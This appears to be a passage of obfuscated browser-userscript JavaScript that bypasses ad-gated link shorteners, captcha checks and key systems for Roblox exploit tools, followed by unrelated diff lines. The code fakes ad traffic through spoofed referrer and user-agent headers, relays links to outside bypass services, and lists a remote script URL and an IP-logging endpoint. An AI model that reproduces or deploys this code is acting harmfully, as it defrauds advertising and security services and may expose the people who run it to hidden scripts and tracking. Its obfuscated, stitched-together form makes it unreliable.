fetch('https://api-gateway.platoboost.com/v1/sessions/auth/'+_0x203f78+'/'+_0x858d8,{'method':_0x1ec403(0x1b5),'headers':{'Content-Type':_0x1ec403(0x167)},'body':JSON[_0x1ec403(0x26f)]({'captcha':_0x2097bb?await getTurnstileResponse():'','type':_0x2097bb?'Turnstile':''})});if(_0x271d1f['status']===0x1f4){_0x24da6('Please\x20solve\x20the\x20captcha.');return;}_0x271d1f=await _0x271d1f[_0x1ec403(0x21f)](),await sleep(0x3e8);let _0x15ada3=await(await fetch(_0x1ec403(0x2eb)+encodeURIComponent(_0x271d1f[_0x1ec403(0x32d)])))[_0x1ec403(0x216)](),_0x11ec35=new URL(_0x15ada3)[_0x1ec403(0x2e9)][_0x1ec403(0x1aa)]('r'),_0x59bf0a=atob(_0x11ec35);window[_0x1ec403(0x31e)]['assign'](_0x59bf0a);}}else{if(_0x4b6a6b['checkpointCount']===0x2){let _0x6323fd=new URL(window['location'][_0x1ec403(0x2bf)])['searchParams']['get']('tk');if(_0x6323fd)await sleep(0x1388),await(await fetch('https://api-gateway.platoboost.com/v1/sessions/auth/'+_0x203f78+'/'+_0x858d8+'/'+_0x6323fd,{'method':_0x1ec403(0x20a)}))['json']()[_0x1ec403(0x2e2)](async _0x1f57ad=>{const _0xa65c8b=_0x1ec403;if(console[_0xa65c8b(0x314)](_0x1f57ad),_0x1f57ad[_0xa65c8b(0x32d)]['includes'](_0xa65c8b(0x1d9))){window[_0xa65c8b(0x31e)][_0xa65c8b(0x249)]();return;}let _0x1bd9b6=await(await fetch(_0xa65c8b(0x2eb)+encodeURIComponent(_0x1f57ad[_0xa65c8b(0x32d)])))['text'](),_0x3b959a=new URL(_0x1bd9b6)[_0xa65c8b(0x2e9)]['get']('r'),_0x1cec63=atob(_0x3b959a);window[_0xa65c8b(0x31e)][_0xa65c8b(0x1c4)](_0x1cec63);})[_0x1ec403(0x1f2)](_0x138c73=>{alert(_0x138c73);});else{let _0x230c05=_0x4b6a6b[_0x1ec403(0x205)],_0x53fbd7=await fetch(_0x1ec403(0x326)+_0x203f78+'/'+_0x858d8,{'method':_0x1ec403(0x1b5),'headers':{'Content-Type':_0x1ec403(0x167)},'body':JSON['stringify']({'captcha':_0x230c05?await getTurnstileResponse():'','type':_0x230c05?_0x1ec403(0x258):''})});if(_0x53fbd7[_0x1ec403(0x2a4)]===0x1f4){_0x24da6('Please\x20solve\x20the\x20captcha.');return;}_0x53fbd7=await _0x53fbd7[_0x1ec403(0x21f)](),await sleep(0x64);let _0x3d55f8=await(await fetch(_0x1ec403(0x2eb)+encodeURIComponent(_0x53fbd7[_0x1ec403(0x32d)])))[_0x1ec403(0x216)](),_0x46e36e=new URL(_0x3d55f8)[_0x1ec403(0x2e9)][_0x1ec403(0x1aa)]('r'),_0x14597b=atob(_0x46e36e);window['location'][_0x1ec403(0x1c4)](_0x14597b);}}else{if(_0x4b6a6b['checkpointCount']===0x3){let _0x17087a=new URL(window[_0x1ec403(0x31e)]['href'])[_0x1ec403(0x2e9)][_0x1ec403(0x1aa)]('tk');if(_0x17087a)await sleep(0xfa0),await(await fetch(_0x1ec403(0x326)+_0x203f78+'/'+_0x858d8+'/'+_0x17087a,{'method':_0x1ec403(0x20a)}))[_0x1ec403(0x21f)]()[_0x1ec403(0x2e2)](async _0x4f3299=>{const _0x54df2d=_0x1ec403;if(console[_0x54df2d(0x314)](_0x4f3299),_0x4f3299[_0x54df2d(0x32d)]['includes'](_0x54df2d(0x1d9))){window[_0x54df2d(0x31e)][_0x54df2d(0x249)]();return;}let _0x5208c9=await(await fetch('https://bypass.rblx.workers.dev/delta-decrypt?url='+encodeURIComponent(_0x4f3299[_0x54df2d(0x32d)])))[_0x54df2d(0x216)](),_0xb88457=new URL(_0x5208c9)[_0x54df2d(0x2e9)]['get']('r'),_0x31575e=atob(_0xb88457);window[_0x54df2d(0x31e)]['assign'](_0x31575e);})['catch'](_0x2fe010=>{alert(_0x2fe010);});else{let _0xd66dc1=_0x4b6a6b[_0x1ec403(0x205)],_0x527ea1=await fetch(_0x1ec403(0x326)+_0x203f78+'/'+_0x858d8,{'method':_0x1ec403(0x1b5),'headers':{'Content-Type':_0x1ec403(0x167)},'body':JSON[_0x1ec403(0x26f)]({'captcha':_0xd66dc1?await getTurnstileResponse():'','type':_0xd66dc1?_0x1ec403(0x258):''})});if(_0x527ea1[_0x1ec403(0x2a4)]===0x1f4){_0x24da6(_0x1ec403(0x32e));return;}_0x527ea1=await _0x527ea1[_0x1ec403(0x21f)](),await sleep(0x64);let _0x36e571=await(await fetch(_0x1ec403(0x2eb)+encodeURIComponent(_0x527ea1['redirect'])))['text'](),_0x3473d4=new URL(_0x36e571)[_0x1ec403(0x2e9)][_0x1ec403(0x1aa)]('r'),_0x2da307=atob(_0x3473d4);window[_0x1ec403(0x31e)][_0x1ec403(0x1c4)](_0x2da307);}}}}}async function notification_failed(){const _0x40bbf3=_0x9d0720;function _0x59556d(_0x4453ab,_0x550539=0x1){const _0xb14f34=_0x2600,_0x1a1a5f=document['createElement'](_0xb14f34(0x226));_0x1a1a5f['style'][_0xb14f34(0x336)]=_0xb14f34(0x16d),_0x1a1a5f[_0xb14f34(0x30e)]['top']='20px',_0x1a1a5f[_0xb14f34(0x30e)][_0xb14f34(0x240)]='-300px',_0x1a1a5f['style'][_0xb14f34(0x281)]='15px',_0x1a1a5f[_0xb14f34(0x30e)][_0xb14f34(0x1ae)]=_0xb14f34(0x232),_0x1a1a5f[_0xb14f34(0x30e)][_0xb14f34(0x1f0)]=_0xb14f34(0x239),_0x1a1a5f[_0xb14f34(0x30e)][_0xb14f34(0x1a2)]=_0xb14f34(0x2f1),_0x1a1a5f[_0xb14f34(0x30e)]['borderRadius']='5px',_0x1a1a5f['style'][_0xb14f34(0x2a0)]=_0xb14f34(0x183),_0x1a1a5f[_0xb14f34(0x30e)][_0xb14f34(0x318)]=_0xb14f34(0x2e1),_0x1a1a5f[_0xb14f34(0x30e)]['opacity']='0',_0x1a1a5f['style'][_0xb14f34(0x1e4)]=_0xb14f34(0x2f5),_0x1a1a5f[_0xb14f34(0x30e)][_0xb14f34(0x2f3)]=_0xb14f34(0x236),_0x1a1a5f[_0xb14f34(0x30e)][_0xb14f34(0x2fd)]=_0xb14f34(0x19b),_0x1a1a5f[_0xb14f34(0x30e)][_0xb14f34(0x244)]=_0xb14f34(0x202),_0x1a1a5f[_0xb14f34(0x30e)][_0xb14f34(0x1e9)]=_0xb14f34(0x202),_0x1a1a5f[_0xb14f34(0x30e)][_0xb14f34(0x1f8)]=_0xb14f34(0x202),_0x1a1a5f[_0xb14f34(0x2d8)]=_0xb14f34(0x2e4)+_0x4453ab;const _0x23090e=document['createElement'](_0xb14f34(0x30e));_0x23090e['innerHTML']='\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20@keyframes\x20bounceIn\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x200%\x20{\x20transform:\x20scale(0.8);\x20opacity:\x200;\x20right:\x20-300px;\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2050%\x20{\x20transform:\x20scale(1.1);\x20right:\x2020px;\x20opacity:\x201;\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20100%\x20{\x20transform:\x20scale(1);\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20@keyframes\x20pulse\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x200%\x20{\x20transform:\x20scale(1);\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2050%\x20{\x20transform:\x20scale(1.05);\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20100%\x20{\x20transform:\x20scale(1);\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20@keyframes\x20slideOutShrink\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x200%\x20{\x20opacity:\x201;\x20right:\x2020px;\x20transform:\x20scale(1);\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20100%\x20{\x20opacity:\x200;\x20right:\x20-300px;\x20transform:\x20scale(0.8);\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20',document[_0xb14f34(0x212)][_0xb14f34(0x1a4)](_0x23090e),document[_0xb14f34(0x215)][_0xb14f34(0x1a4)](_0x1a1a5f),setTimeout(()=>{const _0xacea7c=_0xb14f34;_0x1a1a5f[_0xacea7c(0x30e)][_0xacea7c(0x2e0)]='1',_0x1a1a5f[_0xacea7c(0x30e)][_0xacea7c(0x240)]=_0xacea7c(0x2d9),_0x1a1a5f['style'][_0xacea7c(0x1e4)]='scale(1)',_0x1a1a5f[_0xacea7c(0x30e)][_0xacea7c(0x1b4)]=_0xacea7c(0x2f9);},0x64),setTimeout(()=>{const _0x3eadbb=_0xb14f34;_0x1a1a5f[_0x3eadbb(0x30e)][_0x3eadbb(0x1b4)]=_0x3eadbb(0x266),setTimeout(()=>{const _0x4e8f29=_0x3eadbb;_0x1a1a5f[_0x4e8f29(0x1ac)]();},0x320);},_0x550539);}_0x59556d(_0x40bbf3(0x2b1),0x7530);}async function lvdl(){const _0x3e2eef=_0x9d0720;let _0x25ce8c=new URL(window[_0x3e2eef(0x31e)][_0x3e2eef(0x2bf)])['searchParams']['get']('r');if(_0x25ce8c){adSpoof(atob(_0x25ce8c),window['location'][_0x3e2eef(0x186)]);return;}}function sleep(_0x2e42bb){return new Promise(_0x4598b8=>setTimeout(_0x4598b8,_0x2e42bb));}function adSpoof(_0x48345d,_0xf047ef){return new Promise((_0x3e7734,_0x154f51)=>{const _0x2a6c87=_0x2600;GM_xmlhttpRequest({'method':_0x2a6c87(0x303),'url':_0x48345d,'anonymous':!0x0,'headers':{'user-agent':_0x2a6c87(0x23d),'accept':_0x2a6c87(0x1d7),'accept-encoding':_0x2a6c87(0x2d5),'accept-language':'en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7','sec-ch-ua':_0x2a6c87(0x1d4),'sec-ch-ua-mobile':'?1','sec-ch-ua-platform':_0x2a6c87(0x282),'referrer':_0xf047ef,'sec-fetch-dest':_0x2a6c87(0x184),'sec-fetch-mode':'navigate','sec-fetch-site':_0x2a6c87(0x269),'sec-fetch-user':'?1','upgrade-insecure-requests':'1'},'onload':function(_0x600d55){},'onerror':function(_0x5b61a8){const _0x167cf5=_0x2a6c87;console[_0x167cf5(0x314)](_0x5b61a8);}});});}function _0x33d0(){const _0x4a9893=['requestAnimationFrame','gzip,\x20deflate,\x20br','adshnk.com','Anti-bot\x20system\x20detected,\x20waiting\x20for\x20CAPTCHA\x20completion...','innerHTML','20px','getBoundingClientRect','API\x20returned\x20a\x20Content:','.recaptcha-checkbox-border','https://spdmteam.com/key-system-3?hwid=','API\x20response\x20doesn\x27t\x20contain\x20a\x20valid\x20URL\x20or\x20key','from','opacity','9999','then','hohohubv-ac90f67762c4.herokuapp.com','<strong>Failded\x20to\x20bypass,\x20please\x20contact</strong>','https://us-central1-social-infra-prod.cloudfunctions.net/linksService/link/guid/','2569','\x20stages\x20completed','3170','searchParams','exec','https://bypass.rblx.workers.dev/delta-decrypt?url=','failed\x20to\x20authenticate','waitForElement','floor','&checkpoints=','placeholder','14px','lootlink.org/s?','display','RC\x20SOLVED','scale(0.8)','INFO','Sending\x20request\x20to\x20primary\x20API...','value','bounceIn\x200.8s\x20ease-out,\x20pulse\x201.5s\x20ease-in-out\x20infinite\x201.2s','documentElement','Invalid\x20API\x20Key!','Simulated\x20mouse\x20movement\x20to\x20(','flexDirection','pathname','border','undefined','1px\x20solid\x20#ccc','https://hohohubv-ac90f67762c4.herokuapp.com/','GET','Valid\x20URL\x20found\x20from\x20fallback\x20API,\x20redirecting\x20to:','a[href*=\x22checkpoints=\x22]','APIKEY\x20function\x20not\x20found!','challenges.cloudflare.com','adshrink.it','RC\x20OPEN\x20BOX','loot-links.com/s?','No\x20button\x20with\x20checkpoints\x20found','An\x20error\x20occurred\x20while\x20solving.\x20Stopping\x20the\x20solver.','service','style','script','Clicked\x20button\x20with\x20text:\x20','Fallback\x20API\x20responded,\x20parsing\x20JSON...','300px','200px','log','Automated\x20Queries\x20Detected','socialwolvez.com','https://api.bypass.vip/bypass?url={link}','zIndex','Error\x20fetching\x20redirect\x20URL:','trigonevo.fun/whitelist/','https://getkey.relzscript.xyz/check2.php','Linkvertise\x20button\x20not\x20found','lootdest.com','location','div[id=\x27fail\x27]','split','https://bypass-fluxus.vercel.app/api/fluxus?link=','paster.so/','boost.ink','Short\x20Jambo','1px\x20solid\x20#ddd','https://api-gateway.platoboost.com/v1/sessions/auth/','borderRadius','black','FIRST_ORDERED_NODE_TYPE','getItem','bypas\x20fail!\x20Ooops,\x20we\x27re\x20getting\x20issues\x20bypassing\x20CloudFlare,\x20Please\x20retry,\x20this\x20is\x20a\x20Server-side\x20Error\x20|\x20Detailed\x20error:\x20Error\x20Solving\x20Turnstile\x20Captcha\x20|\x20Bypass\x20Ended\x20at\x2093/100','message','redirect','Please\x20solve\x20the\x20captcha.','replace','Error:\x20','gateway.platoboost.com/a/','keydown','Bypass\x20failed:\x20','API\x20responded,\x20parsing\x20JSON...','checkbox','position','Failed\x20to\x20retrieve\x20ad\x20link.','parse','keys','div[id=\x27success\x27]','innerText','<a\x20href=\x22$1\x22\x20target=\x22_blank\x22\x20style=\x22color:\x20blue;\x22>$1</a>','#cf-turnstile','=([^&]*)','type','addEventListener','https://loot-links.com/','dispatchEvent','https://ethos.kys.gay/api/free/bypass?url=','Primary\x20API\x20responded,\x20parsing\x20JSON...','Copy','application/json','getElementsByTagName','https://api-gateway.platoboost.com/v1/authenticators/','Bypass\x20CloudFlare\x20Failed!','Failed\x20to\x20inject\x20ads:','random','fixed','Fetch\x20API','Bypass\x20failed:','continue','Attempted\x20Max\x20Retries.\x20Stopping\x20the\x20solver','trigonevo.com/getkey/','fluxusbypass.pages.dev','.g-recaptcha','scrollBy','48%','length','Button\x20with\x20text\x20\x22','div[class=\x22logo\x22]','100%','relative','/unlock','3&advertiser=linkvertise&OS=ios','2&advertiser=linkvertise&OS=ios','APIKEY\x20function\x20not\x20found','leasurepartment.xyz','#333','click','0\x204px\x208px\x20rgba(0,\x200,\x200,\x200.1)','document','ready','hostname','gap','${APIKEY()}','CAPTCHA\x20not\x20completed\x20after\x20maximum\x20attempts.','offsetParent','sub2unlock.com/','https://test.pandadevelopment.net/getkey?','74946','Starting\x20script,\x20current\x20URL:','a[href*=\x27cloudflare.com\x27][target=\x27_blank\x27]','Error\x20fetching\x20API:','Error\x20parsing\x20API\x20response:\x20','Redirecting\x20in\x208\x20seconds...','text/javascript','HTTP\x20error!\x20status:\x20','keyrblx.com/getkey/','Primary\x20API\x20response\x20doesn\x27t\x20contain\x20a\x20valid\x20URL\x20or\x20status,\x20or\x20URL\x20is\x20detected','1&advertiser=linkvertise&OS=ios','hwid=','http://','noConflict','column','stop','checkpoints','Parsed\x20API\x20response:\x20','src','overflowY','Clicked\x20button\x20with\x20highest\x20checkpoints\x20value:\x20','fontSize','a[href=\x27https://getkey.relzscript.xyz/check3.php\x27]','appendChild','Copy\x20All','#28a745','host','loot-links','API\x20might\x20be\x20offline.\x20Do\x20you\x20want\x20to\x20use\x20Bypass.city?','get','key','remove','663006qHjTuG','backgroundColor','clipboard','omg190','https://','warn','failed\x20to\x20get\x20stages','animation','POST','indexOf','Error:\x20API\x20might\x20be\x20offline\x20or\x20returned\x20an\x20invalid\x20response.','example.com','Loading...','sessiontoken','Failed\x20to\x20fetch\x20URL','#f9f9f9','API\x20returned\x20a\x20key\x20instead\x20of\x20a\x20URL.','Valid\x20URL\x20found\x20from\x20primary\x20API,\x20redirecting\x20to:','https://loot-link.com/s?mYit','Copied!','API\x20response\x20status:\x20','props','PartOfUrlName','assign','destination','bottom','ERROR','success','provider','true','parentElement','Bypass\x20detected.\x20Might\x20not\x20be\x20supported:','#4CAF50','keysystem.fluxteam.net','Trying\x20fallback\x20API...','Encoded\x20URL\x20found,\x20redirecting\x20to\x20decoded\x20URL:','6ShmSfX','links-loot.com/s?','string','\x22Not\x20A(Brand\x22;v=\x2299\x22,\x20\x22Google\x20Chrome\x22;v=\x22121\x22,\x20\x22Chromium\x22;v=\x22121\x22','8hZFTyO','Please\x20enter\x20a\x20valid\x20URL.','text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','0px\x204px\x2015px\x20rgba(0,\x200,\x200,\x200.2)','https://gateway.platoboost.com/','https://flux.li/android/external/start.php?HWID=','button','object','search','CAPTCHA\x20solved','https://loot-link.com/s?qlbU','a.relative','5px','fontFamily','maxWidth','transform','Yes','getAttribute','16px','http','justifyContent','Clicked\x20button\x20with\x20class:\x20','350px','stages','name','startsWith','Scrolled\x20the\x20page','color','https://check-whitelist.vercel.app/free/logip?&apikey=','catch','failed\x20to\x20validate\x20stage','createElement','whiteSpace','1145696VivNaQ','global_module','textAlign','div[class=\x27ray-id\x27]','48\x20Hours\x20Key','Unsupported\x20URL\x20given','timeout','getResponse','dest','https://lootdest.com/s?qljL','short-jambo.com','height','center','xmlHttpRequest','marginTop','captcha','1000','exports','data','Sending\x20request\x20to\x20API...','PUT','Clear','write','Parsed\x20JSON\x20from\x20fallback\x20API:','https://beacon-mu.vercel.app/relzscript?link=','setTimeout','.g-recaptcha-response','Failed\x20to\x20copy\x20text:\x20','head','error','evaluate','body','text','forEach','https://api.codex.lol/v1/stage/authenticate','Get\x20started','pre-wrap','translateY(-50%)','pointer','parent','24px','json','referrer','Button\x20with\x20class\x20\x22','getJSON','https://spdmteam.com/key-system-2?hwid=','form','Failed\x20to\x20copy:\x20','div','pageProps','.h-captcha[style=\x22display:\x20none;\x22]','Error\x20copying\x20Text\x20to\x20clipboard','https://fluxusbypass.pages.dev/?link=','Error:\x20Primary\x20API\x20might\x20be\x20offline\x20or\x20returned\x20an\x20invalid\x20response.','cursor','https://pandadevelopment.net/getkey?','https://linkvertise.com/376138/arceus-x-neo-key-system-1?o=sharing','AsyncFunction','break-word','hwid','#444','firstChild','marginBottom','https://keyrblx.com/getkey/','flex','#008CBA','linkvertise.com','#fff','marginRight','targeturl','12\x20Hours\x20Key','Mozilla/5.0\x20(Linux;\x20Android\x208.1.0;\x20GO3C\x20Build/OPM2.171019.012;\x20wv)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Version/4.0\x20Chrome/88.0.4324.141\x20Mobile\x20Safari/537.36','Valid\x20URL\x20found,\x20redirecting\x20to:','translateX(-50%)','right','lootdest.org/s?','bold','block','alignItems','.h-captcha','Clicked\x20button\x20with\x20delay:\x20','Parsed\x20JSON:','a[href*=\x27https://loot-link.com/s\x27]','reload','Clicked\x20button\x20with\x20href\x20containing:\x20','Primary\x20API\x20response\x20doesn\x27t\x20contain\x20a\x20valid\x20URL\x20or\x20status,\x20or\x20URL\x20is\x20detected.','cf-turnstile','sub2get.com/link?l=','#cf-chl-widget-905to_response','Arial,\x20sans-serif','Current\x20URL:\x20','Please\x20solve\x20the\x20captcha','find','API\x20returned\x20a\x20Content\x20instead\x20of\x20a\x20URL.','&service=','Text\x20copied\x20to\x20clipboard!','NEO','Detected\x20keyrblx\x20URL\x20from\x20fallback,\x20waiting\x2010\x20seconds\x20before\x20redirecting...','Turnstile','Bypassing\x20is\x20disabled\x20for\x20ID\x20type:\x20','textContent','Not\x20supported.','58867gzSykv','Error\x0a','Fallback\x20API\x20response\x20doesn\x27t\x20contain\x20a\x20valid\x20URL\x20or\x20URL\x20is\x20detected.','querySelectorAll','37.75%','fontWeight','//mildcauliflower.com/6d/04/11/6d04112dc059789eff804dbcc51df896.js','https://spdmteam.com/api/keysystem?step=','https://loot-link.com/','/a/','slideOutShrink\x200.8s\x20ease-in','action','link','none','singleNodeValue','API\x20returned\x20a\x20key:','result','top','includes','stringify','#dc3545','input[type=\x27checkbox\x27]','1857160sEJFeA','writeText','linksloot.net/s?','bstlar.com/','\x22\x20not\x20found','left','rekonise.com','function','50%','mousemove','12763926mJMcaX','auto','substr','some','debug-messages','padding','\x22Android\x22','39097','&url=','responseText','Continue\x20button\x20not\x20found\x20on\x20the\x20page','setInterval','paypal.com','https://linkvertise.com/','Linkvertise','bypassed','&provider=linkvertise','API\x20did\x20not\x20return\x20a\x20valid\x20result','Please\x20choose\x20providers','https://ethos-testing.vercel.app/api/letsboost/bypass?link=','Copied\x20to\x20clipboard!','2474353UucmFf','rgba(0,0,0,0.8)','#recaptcha-accessible-status','notification-container','android-session','removeChild','87731','title','Detected\x20keyrblx\x20URL,\x20waiting\x2010\x20seconds\x20before\x20redirecting...','toString','querySelector','false','social-unlock.com/','42261adHhKP','10000','boxShadow','notification-box','10%','API\x20response\x20doesn\x27t\x20contain\x20a\x20valid\x20URL\x20or\x20key.\x20Redirecting\x20to\x20bypass.city.','status','width','&provider=','100vw','Error:\x20Fallback\x20API\x20might\x20be\x20offline\x20or\x20returned\x20an\x20invalid\x20response.','10px','100vh','aria-checked','white','Error\x20during\x20retry:','Continue','\x22\x20and\x20text\x20\x22','onclick','Bacon\x20But\x20Pro','getkey.relzscript.xyz/','failed\x20to\x20initiate\x20stage','clickElement','5px\x2010px','Keyrblx\x20URL\x20detected.\x20Waiting\x2010\x20seconds\x20before\x20redirecting...','linkvertise.com/','https://api.bypass.vip/bypass?url=','trim','https://api.codex.lol/v1/stage/stages','Stage\x20completed','application/x-www-form-urlencoded','https://pandadevelopment.net/getkey?hwid=','API\x20response:\x20','href','uuid','url','test','[?&]','lootlinks.co/s?','mboost.me','input[value=\x27Verify\x20you\x20are\x20human\x27][type=\x27button\x27]','50px','Error\x20in\x20API\x20request','letsboost.net','div.glass-light.bg-blue-600','First\x20API\x20response\x20doesn\x27t\x20contain\x20a\x20valid\x20URL\x20or\x20key','Key\x20copied\x20to\x20clipboard','bot-hosting.net/panel/','Close','First\x20API\x20response\x20doesn\x27t\x20contain\x20a\x20valid\x20URL\x20or\x20key.','getElementById','lootdest.info/s?','work.ink/','#g-recaptcha-response'];_0x33d0=function(){return _0x4a9893;};return _0x33d0();}function linkvertiseSpoof(_0xadea41){return new Promise((_0x175fff,_0x4fa58a)=>{const _0x140d9a=_0x2600;GM[_0x140d9a(0x203)]({'method':'GET','url':_0xadea41,'headers':{'Referer':_0x140d9a(0x289)},'onload':function(_0x306523){const _0xcda66=_0x140d9a;_0x175fff(_0x306523[_0xcda66(0x285)]);},'onerror':function(_0x3d1420){_0x4fa58a(_0x3d1420);}});});}async function getTurnstileResponse(){const _0x3ddf14=_0x9d0720;let _0x54593b='';for(;;){try{if(_0x54593b=turnstile[_0x3ddf14(0x1fd)]())break;}catch(_0x4f991){}await sleep(0x1);}return turnstile[_0x3ddf14(0x1fd)]();}function base64decode(_0x57a992){const _0x5094eb=_0x9d0720;return atob(_0x57a992=_0x57a992[_0x5094eb(0x32f)](/-/g,'+')['replace'](/_/g,'/'));}async function start(){const _0x887d72=_0x9d0720;switch(window[_0x887d72(0x31e)][_0x887d72(0x186)]){case'mobile.codex.lol':await codex();break;case _0x887d72(0x2e3):await hohohub();break;case _0x887d72(0x278):await rekonise();break;case _0x887d72(0x2c9):await letsboost();break;case _0x887d72(0x323):await boostink();case'mboost.me':await mboost();}}!(function(){'use strict';const _0x1e0946=_0x9d0720;if(_0x1e0946(0x2d6)===window[_0x1e0946(0x31e)]['hostname']||_0x1e0946(0x308)===window[_0x1e0946(0x31e)][_0x1e0946(0x186)]){let _0x37f63d=setInterval(()=>{const _0x3f0c00=_0x1e0946;_0x3f0c00(0x1dc)==typeof _sharedData&&0x0 in _sharedData&&_0x3f0c00(0x1c5)in _sharedData[0x0]?(clearInterval(_0x37f63d),document[_0x3f0c00(0x20c)](_sharedData[0x0][_0x3f0c00(0x1c5)]),window[_0x3f0c00(0x31e)][_0x3f0c00(0x32f)](document[_0x3f0c00(0x215)][_0x3f0c00(0x25a)])):_0x3f0c00(0x300)!=typeof ___reactjsD&&_0x3f0c00(0x1dc)==typeof window[___reactjsD['o']]&&_0x3f0c00(0x1d3)==typeof window[___reactjsD['o']][_0x3f0c00(0x1fe)]&&(clearInterval(_0x37f63d),window[_0x3f0c00(0x31e)][_0x3f0c00(0x32f)](window[___reactjsD['o']][_0x3f0c00(0x1fe)]));});}else{if(_0x1e0946(0x316)===window[_0x1e0946(0x31e)][_0x1e0946(0x186)])fetch(_0x1e0946(0x2e5)+location[_0x1e0946(0x2fe)][_0x1e0946(0x27e)](0x7))[_0x1e0946(0x2e2)](_0x14353f=>(_0x14353f['ok']||window['location'][_0x1e0946(0x249)](),_0x14353f[_0x1e0946(0x21f)]()))[_0x1e0946(0x2e2)](_0x1b22b2=>{const _0x3bdc92=_0x1e0946;_0x1b22b2&&_0x1b22b2[_0x3bdc92(0x268)]&&_0x1b22b2[_0x3bdc92(0x268)]['url']?window[_0x3bdc92(0x31e)][_0x3bdc92(0x32f)](_0x1b22b2[_0x3bdc92(0x268)][_0x3bdc92(0x2c1)]):window[_0x3bdc92(0x31e)][_0x3bdc92(0x249)]();})['catch'](_0x4abd78=>{alert(_0x4abd78);});else{if(_0x1e0946(0x2c5)===window[_0x1e0946(0x31e)][_0x1e0946(0x186)])try{let _0x1e3032=document[_0x1e0946(0x29b)]('script[id=\x22__NEXT_DATA__\x22]');if(_0x1e3032){let _0x334469=JSON[_0x1e0946(0x159)](_0x1e3032[_0x1e0946(0x25a)]);_0x334469[_0x1e0946(0x1c2)][_0x1e0946(0x227)][_0x1e0946(0x208)][_0x1e0946(0x23b)]?window[_0x1e0946(0x31e)][_0x1e0946(0x32f)](_0x334469[_0x1e0946(0x1c2)][_0x1e0946(0x227)]['data'][_0x1e0946(0x23b)]):window[_0x1e0946(0x31e)][_0x1e0946(0x249)]();}else window[_0x1e0946(0x31e)][_0x1e0946(0x249)]();}catch(_0x1125a2){alert(_0x1125a2);}else{if(_0x1e0946(0x180)===window[_0x1e0946(0x31e)][_0x1e0946(0x186)]){async function _0x479513(_0xc5e60c){const _0xa5844d=_0x1e0946;return JSON[_0xa5844d(0x159)](atob(_0xc5e60c));}async function _0x340e28(){const _0x57331f=_0x1e0946;let _0x134723=await _0x479513(function _0x543480(_0x3036f5){const _0x2bf780=_0x2600;if(_0x3036f5=RegExp(_0x2bf780(0x2c3)+encodeURIComponent(_0x3036f5)+_0x2bf780(0x15f))['exec'](location['search']))return decodeURIComponent(_0x3036f5[0x1]);}('cc'));_0x134723&&_0x134723[_0x57331f(0x268)]?window[_0x57331f(0x31e)][_0x57331f(0x32f)](_0x134723[_0x57331f(0x268)]):window[_0x57331f(0x31e)][_0x57331f(0x249)]();}_0x340e28();}}}}let _0x22a062=window['location'][_0x1e0946(0x2bf)];_0x22a062['includes'](_0x1e0946(0x331))&&gateway(),_0x22a062['includes'](_0x1e0946(0x2b7))&&linkvertise(),_0x22a062[_0x1e0946(0x26e)](_0x1e0946(0x2d2))&&workink(),_0x22a062[_0x1e0946(0x26e)]('workink.net/')&&workink(),_0x22a062[_0x1e0946(0x26e)]('socialwolvez.com/')&&socialwolvez(),_0x22a062[_0x1e0946(0x26e)](_0x1e0946(0x2b2))&&relz(),_0x22a062[_0x1e0946(0x26e)](_0x1e0946(0x29d))&&socialunlock(),_0x22a062['includes'](_0x1e0946(0x2cd))&&bothosting(),_0x22a062['includes'](_0x1e0946(0x172))&&trigon_react(),_0x22a062[_0x1e0946(0x26e)](_0x1e0946(0x31a))&&trigon(),_0x22a062['includes']('mboost.me/a/')&&mboost(),_0x22a062[_0x1e0946(0x26e)](_0x1e0946(0x24d))&&sub2get(),_0x22a062['includes']('lootdest.com/s?')&&lootlabs(),_0x22a062[_0x1e0946(0x26e)](_0x1e0946(0x18b))&&sub2unlock(),_0x22a062['includes'](_0x1e0946(0x1d2))&&lootlabs(),_0x22a062['includes'](_0x1e0946(0x274))&&lootlabs(),_0x22a062['includes'](_0x1e0946(0x2d1))&&lootlabs(),_0x22a062[_0x1e0946(0x26e)](_0x1e0946(0x241))&&lootlabs(),_0x22a062[_0x1e0946(0x26e)]('loot-link.com/s?')&&lootlabs(),_0x22a062[_0x1e0946(0x26e)](_0x1e0946(0x30a))&&lootlabs(),_0x22a062[_0x1e0946(0x26e)](_0x1e0946(0x2f2))&&lootlabs(),_0x22a062[_0x1e0946(0x26e)](_0x1e0946(0x322))&&paster(),_0x22a062['includes'](_0x1e0946(0x275))&&bstlar(),_0x22a062[_0x1e0946(0x26e)](_0x1e0946(0x195))&&keyrblx(),_0x22a062[_0x1e0946(0x26e)](_0x1e0946(0x2c4))&&lootlabs();}()),lvdl(),start();
+if (document.title == 'Just a moment...') {
+    return;
+}
+
+var currentURL = window.location.href;
